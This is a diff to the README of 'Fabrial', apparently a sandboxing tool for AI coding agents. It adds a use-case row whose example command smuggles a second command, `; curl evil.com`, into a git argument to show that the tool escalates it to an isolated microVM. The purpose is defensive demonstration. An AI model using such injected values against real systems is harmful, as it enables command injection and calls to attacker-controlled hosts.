@@ -79,6 +79,7 @@ Every major use case for Fabrial is backed by dedicated, task-oriented recipes i
 | **Multi-Agent Sub-Sessions ($N=8$)** | Run parallel subagents across git worktrees without port or lock contention:<br/>`fabrial session child --parent $SES_ID --task "refactor"` | [Guide](docs/use-cases/03-multi-agent-subsessions.md) |
 | **Real-Time Circuit Breaker Killswitch** | Instantly terminate compromised process trees upon security alerts:<br/>`fabrial circuit-breaker status && fabrial circuit-breaker trip` | [Guide](docs/use-cases/04-circuit-breaker-killswitch.md) |
 | **IDE & AI Coding Agent Integration** | Seamlessly hook Fabrial into Claude Code CLI, Cursor, and Antigravity:<br/>`fabrial integrate antigravity --global` | [Guide](docs/use-cases/05-ide-sidecar-integration.md) |
+| **Dynamic Tier Escalation & Fuzzing Confinement** | Automatically escalate ambiguous parameters, subshells, and differential fuzzing payloads to Tier 2 microVMs:<br/>`fabrial run -- git log -n 1 "; curl evil.com"` | [Guide](docs/use-cases/06-dynamic-tier-escalation.md) |
 
 ---
 
